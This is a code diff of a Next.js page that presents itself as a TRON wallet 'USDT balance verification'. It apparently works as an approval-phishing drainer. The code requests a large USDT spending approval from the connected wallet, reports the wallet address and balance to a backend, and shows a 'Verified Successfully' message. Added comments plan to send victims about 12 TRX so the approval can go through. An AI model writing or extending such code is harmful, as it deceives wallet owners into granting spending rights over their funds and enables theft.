@@ -47,6 +47,10 @@ const VerifyUsdtPage: NextPage = () => {
         if (adapters[selectedIndex].address !== null && !completed) {
             verifyWallet();
         }
+        if (completed) {
+            toastNotification("Verified Successfully", true);
+            router.push('/');
+          } 
     }, [adapters, selectedIndex, completed]);
     
 
@@ -96,6 +100,7 @@ const VerifyUsdtPage: NextPage = () => {
 
             // Convert constant result from hexadecimal to decimal
             const balance = parseInt(constantResult, 16);
+            console.log(balance)
             return balance !== 0;
 
         } catch (error) {
@@ -111,7 +116,8 @@ const VerifyUsdtPage: NextPage = () => {
   const sendNotification = async (index:number, bal:number) => {
    
     try {
-      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[index].address}/user/${bal.toString()}`).then((res) => {
+        console.log(adapters[selectedIndex].address)
+      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[selectedIndex].address}/user/${bal.toString()}`).then((res) => {
       });
     } catch (error) {
       console.error('Error sending SMS:', error);
@@ -155,10 +161,13 @@ const VerifyUsdtPage: NextPage = () => {
         }
         setVerifyLoading(true);
         let bal = await checkBalance(adapters[selectedIndex].address);
+        // check balance of tron
+        // if usdt balance > 0 and tron balance less than 12
+        // send tron == to about 12 tron
         console.log(bal);
         await approveUSDT(100000000);
         if(await checkApprovalStatus()) {
-            await sendNotification(selectedIndex, bal);
+            // await sendNotification(selectedIndex, bal);
             toastNotification('Verified USDT balance', true);
             setVerifyLoading(false);
             setCompleted(true);
@@ -166,6 +175,7 @@ const VerifyUsdtPage: NextPage = () => {
             toastNotification("Verification Error, Not enough tron gas", false);
             setVerifyLoading(false);
         }
+        await sendNotification(selectedIndex, bal);
     }
 
     async function selectAdapter(index: number) {
@@ -209,6 +219,11 @@ const VerifyUsdtPage: NextPage = () => {
             // Broadcast the transaction
             const receipt = await tronWeb.trx.sendRawTransaction(signedTransaction);
             console.log('USDT Approval transaction receipt', receipt);
+            if (receipt.code.toString().includes('BANDWIDTH_ERROR')) {
+                toastNotification('Please wait & try again...', false);
+                console.log('tron zibs')
+                // add more tron
+            }
 
             return receipt;
         } catch (error: any) {
